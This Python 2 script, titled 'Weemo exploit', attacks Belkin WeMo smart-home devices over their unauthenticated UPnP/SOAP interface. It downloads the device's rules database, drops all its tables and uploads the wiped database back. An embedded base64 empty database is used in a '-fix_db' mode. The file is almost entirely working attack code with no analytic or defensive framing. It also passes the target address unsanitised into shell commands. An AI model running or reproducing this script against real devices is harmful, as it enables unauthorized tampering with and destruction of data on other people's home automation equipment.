import sys
from requests import Request, Session
import os
import sqlite3
import base64
import time
import subprocess as sp

HEADERS_FETCH = {
    "SOAPACTION": "\"urn:Belkin:service:rules:1#FetchRules\"",
    "User-Agent": "CyberGarage-HTTP/1.0",
    "Content-Type": "text/xml; charset = \"utf-8\""
}

FETCH = "<?xml version=\"1.0\" encoding=\"utf-8\"?> " \
        "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">" \
        "<s:Body>" \
        "<u:FetchRules xmlns:u=\"urn:Belkin:service:rules:1\"></u:FetchRules>" \
        "</s:Body>" \
        "</s:Envelope>"

DB_EMPTY = "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" \
           "IFAAAAAA=="

HEADERS_DEL = {
    "SOAPACTION": "\"urn:Belkin:service:rules:1#StoreRules\"",
    "User-Agent": "CyberGarage-HTTP/1.0",
    "Content-Type": "text/xml; charset = \"utf-8\""
}

DATA_DEL_PT1 = "<?xml version=\"1.0\" encoding=\"utf-8\"?> " \
           "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" " \
                "s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"> " \
                    "<s:Body> " \
                        "<u:StoreRules xmlns:u=\"urn:Belkin:service:rules:1\"> " \
                           "<ruleDbVersion>"

DATA_DEL_PT2 = "</ruleDbVersion> " \
                            "<processDb>1</processDb> "\
                            "<ruleDbBody>&lt;![CDATA["

DATA_DEL_PT3 = "]]&gt;</ruleDbBody> "\
                        "</u:StoreRules> "\
                    "</s:Body> " \
                "</s:Envelope> "


HEADERS_GET = {
    "User-Agent": "Wemo/491000 CFNetwork/897.15 Darwin/17.5.0",
}


def execute(cmd):
    o, e = sp.Popen(cmd, stdin=sp.PIPE, stdout=sp.PIPE, shell=True).communicate()
    return o, e


def help():
    print "Usage: " + sys.argv[0] + " [-fix_db] <weemo ip>"


def get_rule_db_version(weemo_ip):
    s = Session()
    req = Request('POST', 'http://' + weemo_ip + ':49153/upnp/control/rules1', data=FETCH, headers=HEADERS_FETCH)
    prepped = req.prepare()
    response = s.send(prepped)
    return int(response.content.split('<ruleDbVersion>')[1].split('</ruleDbVersion>')[0])


def get_db(weemo_ip):
    s = Session()
    req = Request('GET', 'http://' + weemo_ip + ':49153/rules.db', headers=HEADERS_GET)
    prepped = req.prepare()
    response = s.send(prepped)
    # raw db
    raw_db = response.content

    # get db
    execute("rm /tmp/temppluginRules.db")
    with open('/tmp/tmp_zip', 'w') as fp:
        fp.write(raw_db)

    execute("unzip /tmp/tmp_zip -d /tmp/")
    return "/tmp/temppluginRules.db"


def drop_tables(db_path):
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    try:
        c.execute("DROP TABLE BLOCKEDRULES;")
        c.execute("DROP TABLE DEVICECOMBINATION;")
        c.execute("DROP TABLE GROUPDEVICES;")
        c.execute("DROP TABLE LOCATIONINFO;")
        c.execute("DROP TABLE RULEDEVICES;")
        c.execute("DROP TABLE RULES;")
        c.execute("DROP TABLE RULESNOTIFYMESSAGE;")
        c.execute("DROP TABLE SENSORNOTIFICATION;")
        c.execute("DROP TABLE TARGETDEVICES;")
        c.execute("UPDATE sqlite_sequence SET seq=0 WHERE rowid=1;")
    except:
        pass
    conn.commit()
    conn.close()


def prepare_new_db(db_path):
    execute("rm /tmp/rules.db")
    execute("zip -j /tmp/rules.db " + db_path)
    with open("rules.db") as fp:
        b64_data = base64.b64encode(fp.read())
    return b64_data


def send_payload(weemo_ip, payload):
    with open("/tmp/to_send", 'w') as fp:
        fp.write(payload)

    o, _ = execute('curl -H "Content-Type: text/xml; charset=\\"utf-8\\"" -H '
                   '"SOAPACTION: \\"urn:Belkin:service:rules:1#StoreRules\\"" -H '
                   '"User-Agent: CyberGarage-HTTP/1.0" -d "@/tmp/to_send" -X '
                   'POST ' + str(weemo_ip) + ':49153/upnp/control/rules1')

    if 'Storing of rules DB Successful!' in o:
        return True
    return False


def get_params():
    if len(sys.argv) == 2:
        fix_db = False
        weemo_ip = sys.argv[1]
    elif len(sys.argv) == 3 and sys.argv[1] == '-fix_db':
        fix_db = True
        weemo_ip = sys.argv[2]
    else:
        help()
        sys.exit(0)

    return weemo_ip, fix_db

def main():
    print "\nWeemo exploit"
    weemo_ip, fix_db = get_params()

    print "\nGetting the db..."
    db_version = get_rule_db_version(weemo_ip)
    db_path = get_db(weemo_ip)

    print "Dropping schema..."
    drop_tables(db_path)

    print "Sending payload..."
    b64_data = prepare_new_db(db_path) if not fix_db else DB_EMPTY
    data_del = DATA_DEL_PT1 + str(db_version + 2) + DATA_DEL_PT2 + b64_data + DATA_DEL_PT3

    if send_payload(weemo_ip, data_del):
        print "Success! :)"
    else:
        print "Fail :("

if __name__ == "__main__":
    main()

